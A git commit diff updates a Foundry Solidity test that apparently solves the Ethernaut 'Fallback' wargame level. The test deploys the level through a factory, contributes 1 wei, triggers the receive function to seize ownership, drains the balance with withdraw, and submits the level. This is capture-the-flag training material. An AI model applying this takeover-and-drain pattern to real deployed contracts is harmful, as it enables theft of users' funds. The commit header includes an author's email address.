188f78089f0f40066162ddf4b81cdfd8a83d5429
therealharpaljadeja <jadejaharpal14@gmail.com>
2023-01-05 21:39:59 +0530

    feat: modify `Fallback.t.sol` to emulate Ethernaut

--- test/Fallback.t.sol
+++ test/Fallback.t.sol
@@ -3,30 +3,38 @@ pragma solidity ^0.8.0;
 
 import "forge-std/console.sol";
 import "ds-test/test.sol";
-import "../src/Fallback.sol";
+import "../src/Ethernaut.sol";
+import "../src/levels/Fallback/Fallback.sol";
+import "../src/levels/Fallback/FallbackFactory.sol";
 import {Vm} from "forge-std/Vm.sol";
 
 contract FallbackTest is DSTest {
     Fallback public fallbackInstance;
     Vm private constant vm = Vm(HEVM_ADDRESS);
+    Ethernaut ethernaut;
+    FallbackFactory fallbackFactory;
     address eoaAddress = address(69);
 
     function setUp() public {
         // Initializing Fallback contract.
-        fallbackInstance = new Fallback();
+        ethernaut = new Ethernaut();
+        fallbackFactory = new FallbackFactory();
+        ethernaut.registerLevel(fallbackFactory);
         vm.label(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84, "Fallback Owner");
         vm.deal(eoaAddress, 1 ether);
     }
 
     function testIsFallbackCleared() public {
-        vm.startPrank(address(69));
+        vm.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
+        fallbackInstance = Fallback(payable(levelAddress));
         fallbackInstance.contribute{value: 1 wei}();
         assertEq(fallbackInstance.contributions(eoaAddress), 1 wei);
         (bool success, ) = payable(fallbackInstance).call{value: 1 wei}("");
         assertTrue(success);
-        assertEq(fallbackInstance.owner(), eoaAddress);
-
         fallbackInstance.withdraw();
+
+        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)));
 
         vm.stopPrank();
     }
